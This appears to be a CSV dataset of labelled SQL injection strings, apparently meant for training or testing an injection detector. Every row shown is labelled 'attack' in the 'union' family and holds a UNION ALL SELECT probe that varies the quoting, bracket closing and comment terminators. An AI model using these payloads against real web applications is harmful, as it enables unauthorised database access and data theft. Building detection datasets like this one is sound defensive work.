label,payload,family
attack,"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",union
attack,"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",union
attack,"1  )   where 9645  =  9645 union all select null,null,null--",union
attack,"-6656""  )   union all select 3931#",union
attack,"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",union
attack,"1'   )    )    as kpdl where 4443  =  4443 union all select null,null,null,null,null,null--",union
attack,"-4527' union all select 7115,7115#",union
attack,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1%'  )   union all select null,null,null,null,null,null,null,null#",union
attack,"1  )   union all select null,null,null,null--",union
attack,"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",union
attack,"-2112 union all select 2995,2995,2995,2995,2995--",union
attack,"1"" union all select null,null,null,null,null,null--",union
attack,"-9873"" union all select 8020,8020,8020,8020,8020,8020#",union
attack,"1 where 8045  =  8045 union all select null,null,null--",union
attack,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-4972'   )    )    as kfzc where 8817  =  8817 union all select 8817,8817,8817,8817,8817,8817--",union
attack,"-5698'   )    )    as egjr where 5586  =  5586 union all select 5586,5586,5586--",union
attack,"-2979'   )    )    as klou where 7092  =  7092 union all select 7092,7092--",union
attack,"1'  )   union all select null,null#",union
attack,"1""  )   union all select null,null#",union
attack,"-4168'  )   union all select 2618,2618#",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null--",union
attack,"-8200%""   )    )    union all select 7538,7538,7538#",union
attack,"-6854"" where 7794  =  7794 union all select 7794,7794--",union
attack,"-8136'  )   union all select 1324,1324,1324,1324#",union
attack,"-2222' in boolean mode  )   union all select 7649,7649,7649,7649,7649,7649,7649,7649--",union
attack,"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",union
attack,"1%' union all select null,null#",union
attack,"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",union
attack,"-6145'+  (  select nnjn where 1389  =  1389 union all select 1389,1389,1389--",union
attack,"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",union
attack,"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",union
attack,"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",union
attack,"-4427'   )    )    union all select 6357,6357,6357,6357,6357#",union
attack,"1"" union all select null--",union
attack,"-1859' union all select 1781,1781,1781,1781#",union
attack,"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",union
attack,"1'+  (  select sxco where 1623  =  1623 union all select null,null--",union
attack,"1""   )    )    union all select null,null--",union
attack,"1""   )    )    as qejm where 9014  =  9014 union all select null,null,null,null,null,null#",union
attack,"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",union
attack,"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",union
attack,"-6942'  )   union all select 7280,7280,7280#",union
attack,"-7876%'  )   union all select 3909,3909,3909,3909,3909#",union
attack,"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",union
attack,"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",union
attack,"-7448 union all select 4072,4072#",union
attack,"1""  )   where 7840  =  7840 union all select null,null#",union
attack,"-8133'  )   union all select 6417,6417,6417,6417,6417,6417,6417,6417--",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null--",union
attack,"-7511   )    )    as xqzf where 9939  =  9939 union all select 9939,9939,9939,9939,9939,9939,9939--",union
attack,"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",union
attack,"-9871""  )   union all select 9082#",union
attack,"1   )    )    as gobw where 3496  =  3496 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-6249'   )    )     )   union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",union
attack,"1'||  (  select 'xbvz' from dual where 1632  =  1632 union all select null,null,null,null,null,null,null,null--",union
attack,"-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",union
attack,"-4176'+  (  select 'muio' where 4256  =  4256 union all select 4256,4256,4256,4256,4256,4256#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null--",union
attack,"1%"" union all select null--",union
attack,-1816%'   )    )     )   union all select 2072--,union
attack,"1%""  )   union all select null,null,null,null,null,null,null--",union
attack,"-5041'   )    )     )   union all select 4820,4820,4820,4820,4820,4820--",union
attack,"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",union
attack,"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",union
attack,"1"" where 1852  =  1852 union all select null,null,null,null,null,null,null,null,null#",union
attack,"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",union
attack,"1""  )   as doai where 7024  =  7024 union all select null,null,null,null,null,null,null,null--",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%""  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",union
attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-1174"" union all select 4303,4303,4303,4303#",union
attack,"-2840'   )    )     )   union all select 3025,3025,3025,3025--",union
attack,"-8888%'  )   union all select 5312,5312,5312,5312,5312,5312,5312,5312--",union
attack,"-1490'||  (  select 'uzbm' from dual where 3181  =  3181 union all select 3181,3181,3181,3181,3181--",union
attack,"1 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1'  )   union all select null,null--",union
attack,"1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#",union
attack,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",union
attack,"-2007%'   )    )    union all select 7298,7298,7298#",union
attack,1  )   as uhmm where 2304  =  2304 union all select null#,union
attack,"1%""   )    )    union all select null,null,null,null#",union
attack,1   )    )    union all select null--,union
attack,"1'  )   as asjj where 1721  =  1721 union all select null,null,null,null,null,null--",union
attack,"-4286%""   )    )     )   union all select 2229,2229,2229,2229,2229,2229#",union
attack,"-1148""   )    )    union all select 5442,5442,5442,5442#",union
attack,"-5078 union all select 9708,9708--",union
attack,"-7350'   )    )     )   union all select 9207,9207,9207,9207--",union
attack,"-1908""  )   where 6420  =  6420 union all select 6420,6420,6420,6420--",union
attack,"-7737'||  (  select 'xalo' where 9219  =  9219 union all select 9219,9219,9219,9219#",union
attack,"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",union
attack,"-6453""   )    )    as hehs where 9363  =  9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",union
attack,"1"" union all select null,null,null,null,null--",union
attack,"-7412""  )   as qngt where 2041  =  2041 union all select 2041--",union
attack,"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",union
attack,"-6381%""   )    )     )   union all select 1503,1503,1503,1503#",union
attack,"1""  )   where 1416  =  1416 union all select null,null,null#",union
attack,"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",union
attack,"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",union
attack,"-5911 union all select 2245,2245,2245,2245,2245,2245#",union
attack,"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",union
attack,"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",union
attack,"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",union
attack,"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",union
attack,"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",union
attack,-2214'  )   union all select 8228#,union
attack,"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",union
attack,"-7006' where 6966  =  6966 union all select 6966,6966,6966,6966#",union
attack,"-7258""  )   as wjjr where 2110  =  2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",union
attack,"1'+  (  select 'mtpt' where 7483  =  7483 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-9015%""  )   union all select 6948,6948--",union
attack,"1 where 2914  =  2914 union all select null,null,null#",union
attack,"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",union
attack,"-9634'   )    )     )   union all select 4141,4141#",union
attack,"1""  )   as uuth where 8555  =  8555 union all select null,null#",union
attack,"-9861' union all select 5710,5710,5710,5710,5710--",union
attack,"-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--",union
attack,"-3604'  )   as fyev where 7259  =  7259 union all select 7259,7259,7259,7259--",union
attack,"1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1'   )    )    union all select null,null,null--",union
attack,"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",union
attack,"-9924   )    )    as zgqa where 2867  =  2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",union
attack,"-8655  )   where 3910  =  3910 union all select 3910,3910#",union
attack,"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",union
attack,"1' union all select null,null,null,null,null,null,null#",union
attack,"-9451%""  )   union all select 9963,9963,9963--",union
attack,"-8054'   )    )    union all select 5232,5232,5232,5232,5232,5232,5232#",union
attack,"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",union
attack,"-6581'||  (  select 'hpjd' where 7608  =  7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",union
attack,"-3518  )   union all select 1877,1877,1877,1877#",union
attack,"-5198   )    )     )   union all select 7089,7089,7089,7089,7089,7089,7089,7089#",union
attack,"-7307'   )    )    union all select 5215,5215,5215,5215--",union
attack,"-5989%"" union all select 3581,3581,3581,3581,3581--",union
attack,"1'||  (  select 'xbwg' where 7518  =  7518 union all select null,null,null,null,null,null--",union
attack,"-5606  )   union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",union
attack,"1   )    )    as jmcp where 8624  =  8624 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1%""  )   union all select null,null,null,null,null,null--",union
attack,"1"" where 7290  =  7290 union all select null,null,null,null,null,null,null--",union
attack,"1'||  (  select 'tkmc' from dual where 9675  =  9675 union all select null,null,null,null--",union
attack,-6327'   )    )    union all select 2685--,union
attack,"-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--",union
attack,"-3321"" where 1603  =  1603 union all select 1603,1603,1603,1603#",union
attack,"1"" where 1765  =  1765 union all select null,null,null,null,null,null#",union
attack,-5039 union all select 2114#,union
attack,"1%' union all select null,null,null,null#",union
attack,"-9098' union all select 3476,3476,3476,3476,3476,3476#",union
attack,"1%""   )    )     )   union all select null,null--",union
attack,"-1256' in boolean mode  )   union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",union
attack,"-1275"" union all select 7861,7861,7861,7861,7861#",union
attack,"1%'  )   union all select null,null,null,null--",union
attack,"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null#",union
attack,"1%""  )   union all select null,null,null#",union
attack,"1%""   )    )     )   union all select null,null#",union
attack,"1""  )   where 3058  =  3058 union all select null--",union
attack,"1   )    )    union all select null,null,null,null,null,null,null,null,null#",union
attack,"1   )    )    union all select null,null,null#",union
attack,"1%"" union all select null,null,null,null,null,null,null,null,null#",union
attack,"-3758'   )    )    union all select 9460,9460,9460,9460,9460,9460,9460,9460--",union
attack,"-9014%'  )   union all select 4211,4211,4211,4211,4211,4211#",union
attack,"-7950 where 9619  =  9619 union all select 9619,9619,9619,9619--",union
attack,"1'   )    )     )   union all select null,null,null,null#",union
attack,"-7126'   )    )    as fzpp where 8078  =  8078 union all select 8078,8078,8078,8078,8078,8078,8078#",union
attack,"1'  )   union all select null,null,null#",union
attack,"1  )   as jvuo where 6859  =  6859 union all select null,null,null,null,null,null,null#",union
attack,"-8109%""   )    )    union all select 9089,9089--",union
attack,"-9007  )   as gill where 6462  =  6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",union
attack,"-6731"" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166--",union
attack,"-9886%'   )    )     )   union all select 5191,5191,5191,5191,5191,5191,5191--",union
attack,"-4223'   )    )     )   union all select 7913,7913,7913,7913,7913,7913,7913,7913,7913,7913#",union
attack,"-1238'  )   as lxur where 7075  =  7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#",union
attack,"1%""   )    )    union all select null,null,null,null,null,null--",union
attack,"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#",union
attack,"-6599""   )    )    union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",union
attack,"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#",union
attack,"1%""   )    )     )   union all select null--",union
attack,"1' union all select null,null,null#",union
attack,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
attack,-8553'+  (  select adko where 1750  =  1750 union all select 1750#,union
attack,"1'||  (  select 'mzhj' where 9677  =  9677 union all select null,null,null--",union
attack,"-2601'  )   union all select 2866,2866,2866,2866,2866,2866--",union
attack,"1""   )    )    union all select null,null,null--",union
attack,"1""   )    )    as rrms where 8185  =  8185 union all select null,null,null,null,null,null,null,null--",union
attack,"-8203   )    )    as eqlf where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",union
attack,"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",union
attack,1'+  (  select nash where 4159  =  4159 union all select null#,union
attack,"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",union
attack,"-9630%"" union all select 8592,8592,8592,8592--",union
attack,"-2296"" union all select 7359,7359,7359,7359,7359,7359#",union
attack,"-7676""   )    )    as flov where 7967  =  7967 union all select 7967--",union
attack,"1'   )    )    union all select null,null,null,null#",union
attack,"-2168""   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",union
attack,"-1585%""   )    )    union all select 8818,8818,8818,8818,8818,8818#",union
attack,"1   )    )     )   union all select null,null,null,null,null#",union
attack,"1"" where 2235  =  2235 union all select null,null,null,null,null--",union
attack,"-6368   )    )    union all select 4646,4646,4646,4646,4646,4646,4646--",union
attack,"1"" union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1  )   union all select null,null,null,null,null,null,null,null#",union
attack,-2793'  )   where 2621  =  2621 union all select 2621#,union
attack,"1  )   as lhie where 4631  =  4631 union all select null,null,null,null,null--",union
attack,"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",union
attack,"1'   )    )    as ezpq where 2976  =  2976 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,-8878' in boolean mode  )   union all select 7785#,union
attack,"-4477'   )    )    union all select 8444,8444,8444,8444,8444,8444,8444,8444--",union
attack,"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",union
attack,"-7499%""  )   union all select 1893,1893,1893,1893,1893#",union
attack,"-8703'  )   where 9723  =  9723 union all select 9723,9723,9723,9723,9723#",union
attack,"-9587 union all select 1568,1568,1568,1568,1568,1568#",union
attack,"-4091""   )    )     )   union all select 6694,6694--",union
attack,"-6405' union all select 8235,8235,8235,8235,8235#",union
attack,"-5193 where 2175  =  2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",union
attack,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1  )   where 7775  =  7775 union all select null,null,null,null--",union
